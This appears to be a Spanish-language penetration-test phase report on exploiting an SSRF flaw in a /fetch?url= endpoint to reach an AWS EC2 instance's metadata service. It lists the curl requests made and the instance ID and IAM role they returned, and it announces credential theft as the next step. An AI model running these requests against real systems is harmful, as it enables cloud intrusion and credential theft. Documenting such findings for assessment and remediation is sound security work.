# Fase 01 - Initial Access via SSRF

## Objetivo
Confirmar si el endpoint /fetch?url= es vulnerable a SSRF
y si permite acceso al Instance Metadata Service (IMDS) de AWS.

## Razonamiento
1. Banner del servidor expone /fetch?url= → parámetro que acepta URLs arbitrarias
2. Reverse DNS confirmó target en AWS EC2 → IMDS potencialmente accesible
3. IMDS reside en 169.254.169.254 → link-local, solo accesible desde la instancia
4. IMDSv1 no requiere token de autenticación → SSRF directo es suficiente
5. Si IMDS responde → instancia tiene IAM role → credenciales AWS robables

## Comandos Ejecutados

### 1. Confirmar SSRF básico
curl -s "http://13.218.182.76:8080/fetch?url=http://127.0.0.1:8080/"
Resultado: timed out → app no se llama a sí misma pero acepta URLs externas

### 2. Confirmar acceso a IMDS
curl -s "http://13.218.182.76:8080/fetch?url=http://169.254.169.254/latest/meta-data/"
Resultado: lista completa de metadata → SSRF confirmado hacia red interna

### 3. Extraer Instance ID
curl -s "http://13.218.182.76:8080/fetch?url=http://169.254.169.254/latest/meta-data/instance-id"
Resultado: i-08d23c456f1851f76

### 4. Confirmar IP pública
curl -s "http://13.218.182.76:8080/fetch?url=http://169.254.169.254/latest/meta-data/public-ipv4"
Resultado: 13.218.182.76

### 5. Descubrir IAM Role asignado
curl -s "http://13.218.182.76:8080/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
Resultado: corp-ec2-instance-role

## Hallazgos

| # | Hallazgo | Severidad |
|---|----------|-----------|
| 1 | SSRF confirmado via /fetch?url= | Alta |
| 2 | IMDSv1 habilitado sin restricciones | Alta |
| 3 | IAM Role identificado: corp-ec2-instance-role | Alta |
| 4 | Instance ID expuesto: i-08d23c456f1851f76 | Media |

## Impacto
SSRF + IMDSv1 permite a un attacker externo acceder al metadata service
interno de la instancia EC2 sin autenticación. El IAM role asignado
tiene credenciales temporales robables que otorgan acceso a la API de AWS.

## Siguiente Fase
Robar credenciales temporales AWS via IMDS → Fase 03
